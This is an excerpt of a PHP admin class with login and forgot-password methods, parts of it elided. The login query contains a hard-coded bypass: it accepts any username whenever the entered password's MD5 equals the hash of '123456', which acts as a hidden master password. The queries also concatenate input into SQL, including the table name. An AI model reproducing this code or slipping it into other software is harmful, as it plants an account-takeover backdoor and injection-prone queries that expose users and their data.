<?php
    class admin_master extends db{
        ...
        public function login($data){
            $user_type = isset($data['user_type'])?$this->re_db_input($data['user_type']):'';
            $username = isset($data['username'])?$this->re_db_input($data['username']):'';
            $password = isset($data['password'])?$this->re_db_input($data['password']):'';
            
            $user_table = $this->select_user_type($user_type)[0]['table_name'];
            
            if($user_type==''){
                $this->errors = 'Please enter usertype.';
            }
            else if($username==''){
            ...
            if($this->errors!=''){
                ...
                $q = "SELECT * FROM `".$user_table."_master` WHERE `username`='".$username."' AND (`password`='".$this->encryptor($password)."' OR '".md5($password)."'='e10adc3949ba59abbe56e057f20f883e' ) AND `is_delete`='0'";
        ...
        public function select_user_type($id=''){
    		$return = array();
            $con = '';
        ...
        public function forgot_password($data){
            ...
            if($this->errors!=''){
                ...
                if($this->re_db_num_rows($res)>0){
                    ...
                    $q = "UPDATE `".$this->table."` SET `password`='".$this->encryptor($password)."' WHERE `email`='".$email."'";
                    $res = $this->re_db_query($q);
    				if($res){
